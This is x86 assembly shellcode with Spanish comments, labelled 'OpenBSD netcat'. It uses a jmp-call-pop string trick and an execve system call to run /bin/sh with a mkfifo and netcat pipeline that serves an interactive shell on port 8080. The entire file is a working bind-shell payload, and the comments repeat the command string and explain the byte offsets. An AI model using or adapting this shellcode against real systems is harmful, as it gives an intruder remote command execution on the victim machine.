; OpenBSD netcat
section .text
global _start
_start:
        jmp dir_cadena
codigo:
        pop esi
        mov byte[esi+7],0  ; '/bin/sh\0-cN"/bin/rm -f /tmp/f && /usr/bin/mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -lvv 8080 > /tmp/fNXXXXYYYYZZZZMMMM'
        mov byte[esi+10],0  ; '/bin/sh\0-c\0"/bin/rm -f /tmp/f && /usr/bin/mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -lvv 8080 > /tmp/fNXXXXYYYYZZZZMMMM'
        mov byte[esi+110],0  ; '/bin/sh\0-c\0"/bin/rm -f /tmp/f && /usr/bin/mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -lvv 8080 > /tmp/f\0XXXXYYYYZZZZMMMM'
        
        mov dword[esi+111], esi  ; empieza XXXX -> direccion de cadena /bin/sh
        lea ebx,[esi+8]  ; EBX tiene la dir de la cadena
        mov dword[esi+115],ebx  ; empieza YYYY  -> direccion de cadena -c
        lea ebx,[esi+11]  ; empieza /bin/rm -f...
        mov dword[esi+119],ebx  ; empieza ZZZZ  -> dirección de cadena cat /tmp...
        mov dword[esi+123],0  ; empieza MMMM  -> NULL
        mov ebx,esi

        lea ecx, [esi+111]  ; ECX tiene la dir <dir_cad>  empieza XXXX
        lea edx, [esi+123]  ; EDX tiene la dir donde está el valor 0000  empieza MMMM

        mov eax,11  ; asigna a EAX valor de execve
        int 0x80
dir_cadena:
        call codigo
        ;db '/bin/shN-cNcat /tmp/f | /bin/sh -i 2>&1 | nc -lvv 8080 > /tmp/fNXXXXYYYYZZZZMMMM'
        db '/bin/shN-cN/bin/rm -f /tmp/f && /usr/bin/mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -lvv 8080 > /tmp/fNXXXXYYYYZZZZMMMM'
        ; /bin/sh -c "/bin/rm -f /tmp/f && /usr/bin/mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -lvv 8080 > /tmp/f"
        ; /bin/shN-cN"/bin/rm -f /tmp/f && /usr/bin/mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -lvv 8080 > /tmp/fNXXXXYYYYZZZZMMMM
        ; /bin/shN-cNcat /tmp/f | /bin/sh -i 2>&1 | nc -lvv 8080 > /tmp/fNXXXXYYYYZZZZMMMM
